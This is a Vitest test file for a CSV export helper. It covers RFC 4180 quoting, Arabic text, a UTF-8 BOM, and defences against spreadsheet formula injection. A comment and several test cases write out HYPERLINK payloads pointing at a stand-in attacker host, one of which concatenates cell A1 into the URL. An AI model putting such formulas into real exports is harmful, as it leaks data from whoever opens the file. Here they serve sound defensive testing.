import { describe, expect, it, vi } from 'vitest';
import { downloadCsv, toCsv } from './csv';

describe('toCsv quoting', () => {
  it('leaves plain fields alone', () => {
    expect(toCsv(['a', 'b'], [['1', '2']])).toBe('a,b\r\n1,2');
  });

  it('quotes a field containing the delimiter', () => {
    expect(toCsv(['a'], [['x,y']])).toBe('a\r\n"x,y"');
  });

  it('doubles inner quotes', () => {
    expect(toCsv(['a'], [['say "hi"']])).toBe('a\r\n"say ""hi"""');
  });

  it('quotes a field containing a newline', () => {
    // Long-text answers routinely contain them.
    expect(toCsv(['a'], [['line1\nline2']])).toBe('a\r\n"line1\nline2"');
  });

  it('uses CRLF between records, per RFC 4180', () => {
    expect(toCsv(['a'], [['1'], ['2']])).toBe('a\r\n1\r\n2');
  });

  it('handles an empty body', () => {
    expect(toCsv(['a', 'b'], [])).toBe('a,b');
  });

  it('passes Arabic through unescaped', () => {
    expect(toCsv(['الاسم'], [['حسين']])).toBe('الاسم\r\nحسين');
  });
});

describe('toCsv formula injection', () => {
  // These values are typed by strangers into a public form and opened by an
  // admin in Excel. Without the guard, a submitted answer of
  // =HYPERLINK("https://evil.test?"&A1,"Click") executes on open.
  it.each(['=', '+', '-', '@', '\t', '\r'])('defuses a field starting with %j', prefix => {
    const payload = `${prefix}HYPERLINK("https://evil.test")`;
    const line = toCsv(['a'], [[payload]]).split('\r\n')[1];

    expect(line.startsWith(prefix)).toBe(false);
    expect(line.replace(/^"?'/, '').startsWith(prefix)).toBe(true);
  });

  it('defuses and quotes together', () => {
    expect(toCsv(['a'], [['=SUM(A1,A2)']])).toBe('a\r\n"\'=SUM(A1,A2)"');
  });

  it('does not touch a formula character in the middle of a value', () => {
    expect(toCsv(['a'], [['2 + 2']])).toBe('a\r\n2 + 2');
  });

  it('does not mangle an ordinary negative number', () => {
    // A cost of the guard, and the right trade: a quoted '-5 still reads as
    // -5 to a human, while an executed formula does not.
    expect(toCsv(['a'], [['-5']])).toBe("a\r\n'-5");
  });
});

describe('downloadCsv', () => {
  it('prefixes a UTF-8 BOM so Excel decodes Arabic correctly', async () => {
    const created: Blob[] = [];
    vi.spyOn(URL, 'createObjectURL').mockImplementation(blob => {
      created.push(blob as Blob);
      return 'blob:test';
    });
    vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});

    downloadCsv('responses.csv', 'الاسم\r\nحسين');

    expect(created).toHaveLength(1);

    // Read the raw bytes, not blob.text(): the UTF-8 decode step in the spec
    // strips a leading BOM, so the decoded string can never show it.
    const bytes = new Uint8Array(await created[0].arrayBuffer());
    expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
    expect(created[0].type).toBe('text/csv;charset=utf-8');

    vi.restoreAllMocks();
  });

  it('leaves no anchor behind in the document', () => {
    vi.spyOn(URL, 'createObjectURL').mockReturnValue('blob:test');
    vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});

    downloadCsv('responses.csv', 'a,b');

    expect(document.querySelectorAll('a')).toHaveLength(0);
    vi.restoreAllMocks();
  });
});
